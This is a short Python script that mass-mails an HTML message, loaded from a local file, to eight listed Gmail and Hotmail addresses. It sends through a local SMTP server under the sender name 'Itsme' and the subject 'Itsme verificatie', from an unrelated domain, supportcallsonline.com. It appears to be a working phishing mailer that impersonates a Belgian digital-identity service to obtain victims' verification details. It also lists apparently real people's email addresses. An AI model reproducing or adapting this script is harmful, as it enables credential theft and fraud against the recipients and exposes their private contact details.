import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

FROM_ADDR = "hello@supportcallsonline.com"
FROM_NAME = "Itsme"
SUBJECT   = "Itsme verificatie"

with open("/opt/seki/manual_send/email.html", "r", encoding="utf-8") as f:
    html_body = f.read()

recipients = [
    "nickkatheryn610@gmail.com",
    "Kituyuni@gmail.com",
    "weideclemente825@gmail.com",
    "comicuhasiawmvq@gmail.com",
    "lemkaiandra4ya@hotmail.com",
    "jironsabanopb6uh@hotmail.com",
    "klarezgolezl50v@hotmail.com",
    "veirsdteepea82@hotmail.com"
]

for to_addr in recipients:
    msg = MIMEMultipart("alternative")
    msg["Subject"] = SUBJECT
    msg["From"] = f"{FROM_NAME} <{FROM_ADDR}>"
    msg["To"] = to_addr
    msg.attach(MIMEText(html_body, "html"))
    
    with smtplib.SMTP("localhost", 25) as server:
        server.sendmail(FROM_ADDR, [to_addr], msg.as_string())
    print(f"Sent to {to_addr}")
